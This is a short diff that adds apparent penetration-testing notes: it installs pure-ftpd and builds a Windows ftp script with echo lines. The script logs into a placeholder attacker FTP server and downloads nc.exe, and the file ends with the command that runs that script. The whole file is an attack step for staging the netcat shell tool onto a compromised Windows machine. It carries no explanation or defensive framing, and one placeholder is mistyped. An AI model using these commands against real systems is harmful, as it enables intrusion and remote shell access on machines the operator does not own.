@@ -1,0 +1,13 @@
+apt-get install pure-ftpd
+
+
+echo open {ftp server ip}> ftp.txt
+echo {username}>> ftp.txt
+echo (password}>> ftp.txt
+echo bin >> ftp.txt
+echo GET nc.exe >> ftp.txt
+echo bye >> ftp.txt
+
+ftp –v -n -s:ftp.txt
+
+
